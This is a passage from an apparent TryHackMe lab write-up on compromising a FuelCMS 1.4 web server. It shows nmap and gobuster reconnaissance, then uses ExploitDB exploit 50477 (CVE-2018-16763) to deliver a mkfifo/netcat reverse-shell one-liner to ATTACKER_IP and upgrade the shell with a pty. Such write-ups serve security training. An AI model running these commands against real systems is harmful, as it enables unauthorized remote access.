## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Running some basic `nmap` scans:

```shell-session
$ sudo nmap -sS -vv -p- -oN nmap_stealth_scan.txt TARGET_IP
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

$ sudo nmap -sV -p80 -vv -oN nmap_service_scan.txt TARGET_IP
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

$ sudo nmap -sC --script=vuln -vv -oN nmap_vuln_scan.txt TARGET_IP
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.

```

Now, time for some directory enumeration/traversal stuff:
```shell-session
$ gobuster dir -t 64 -x txt,xml,php -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_dirlist2_3.txt

$ cat gobuster_dirlist2_3.txt | grep "Status: 200"                        
/index.php            (Status: 200) [Size: 16595]
/index                (Status: 200) [Size: 16595]
/home                 (Status: 200) [Size: 16595]
/0                    (Status: 200) [Size: 16595]
/robots.txt           (Status: 200) [Size: 30]
```

The `robots.txt` file is exposed, let's check what it contains:
```txt
## curl http://TARGET_IP/robots.txt
User-agent: *
Disallow: /fuel/
```

Hmm, it seems like the dev is trying to block access to the `/fuel/` directory. The home page of the website at `http://TARGET_IP/` shows us the following:

Checking ExploitDB for some existing exploits for _FuelCMS version 1.4_ shows us 3 different options for gaining initial access, SQL injections, RCE exploits and a CSRF vulnerability that's in version 1.5. I'll be using [this](https://www.exploit-db.com/exploits/50477), based on [CVE-2018-16763](###### [2018-16763](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)) for this writeup.

## Gaining Access

```shell-session
$ python3 50477.py -u http://TARGET_IP/        
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f


# On our machine (in a different session):
$ nc -nvlp 4444         
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44732
sh: 0: can't access tty; job control turned off

$ python -c "import pty; pty.spawn('/bin/bash')"
